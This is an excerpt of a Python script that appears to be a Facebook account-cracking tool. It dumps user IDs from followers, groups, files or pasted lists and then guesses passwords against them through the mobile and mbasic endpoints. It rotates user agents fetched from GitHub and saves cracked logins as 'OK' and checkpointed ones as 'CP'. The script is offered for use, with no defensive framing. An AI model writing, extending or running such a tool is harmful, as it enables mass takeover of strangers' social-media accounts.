...
def uaku():
	try:
		ua=open('SAW-MOBIL.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/Saw4x/1337v/main/SAW-MOBIL.txt').text
		ua=open('SAW-MOBIL.txt','w')
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'ROOK!' in str(response6):
							...
							print("\n ╰─  Login Berhasil | python ROOK_TEAM=M1X.py.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	alvino_xy(f' IP You  : {ip}')
	print('')
	print(P+' [+] 1 - CRACK BA ID \033[33m[ \033[32mON \033[33m] ')
	print(' [+] 2 - CRACK FOLLOWERS ')
	print(' [+] 3 - CRACK GRUOP   ')
	print(' [+] 4 - CRACK FILE \033[33m[ \033[32mON \033[33m]	')
	print(' [+] 5 - HASIL CRACK ')
	print(' [+] 0 - Exit ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[1;91mHOW MANY IDS =  '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;91mPASTE ID  '+str(yz)+' = \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'\033[33mTOTAL IDS ==> {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
...
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>>  Idz Grup :\x1b[1;94m ")
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. CLONE FB KON ')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m2. CLONE FB TAZA ')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m3. CLONE FB KON- TAZA ')
	print('')
	...
	if hu in ['1','01']:
		...
		exit()
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. Mobile \33[m(\x1b[1;93mapi.facebook.com\33[m) \33[m[\x1b[1;92mVery Recomended\33[m]')
	...
	print('')
	hc = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mChoice > \x1b[1;93m')
	print('')
	if hc in ['1','01']:
...
def passwrd():
	print('\x1b[1;92m<--------------------------------------------------------------------------------------------------->')
	print('')
	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}ROOK {h}OK{x} SAVE IN : {h}OK/%s {x}'%(okc))
	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}ROOK {k}CP{x} SAVE IN : {k}CP/%s {x}'%(cpc))
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[DYNO]  {P}{asu}Mbasic{P}{P} {b}{loop}{P}/{p}{len(id)}{P}]OK:{P}[{H}{ok}{P}CP:{P}{k}{cp}{x}[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
